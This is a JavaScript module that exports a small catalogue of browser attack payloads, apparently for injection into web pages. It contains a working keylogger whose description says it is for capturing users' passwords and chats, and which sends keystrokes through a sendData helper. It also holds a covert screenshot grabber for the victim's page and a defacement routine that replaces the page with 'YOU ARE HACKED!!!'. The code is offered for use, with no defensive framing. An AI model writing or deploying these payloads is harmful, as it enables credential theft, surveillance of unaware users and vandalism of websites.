const utils = [
  {
    name: "Key Strokes",
    description: "You will get the keystrokes pressed by the user.\nCan be used when you want to track passwords or chat of a user.",
    func: () => {
      let characters = [];
      function debounce(f, wait) {
        let timerId = null;
        return function (...args) {
          clearTimeout(timerId);
          timerId = setTimeout(() => f.apply(this, args), wait);
        }
      }

      const sendNewData = debounce(async (data) => {
        await sendData(data);
        characters = [];
      }, 1000)

      document.addEventListener("keypress", async (event) => {
        characters.push(event.key)
        sendNewData(characters.join(""));
      })
    }
  },



  {
    name: "Screenshot",
    description: "Takes the screenshot of the user's browser screen (whatever they are looking at)",
    func: () => {
      html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
      })
        .then(function (canvas) {
          // It will return a canvas element
          let image = canvas.toDataURL("image/png", 0.5);
          console.log(image)
        })
        .catch((e) => {
          // Handle errors
          console.log(e);
        });
    }
  },



  {
    name: "Terror",
    description: "Erase page to show `YOU ARE HACKED!!!`",
    func: () => {
      document.body.innerHTML = "<h1 style='color: red; font-size: 150px; text-align: center;'>YOU ARE HACKED!!!</h1>"
    }
  }

]

module.exports = utils
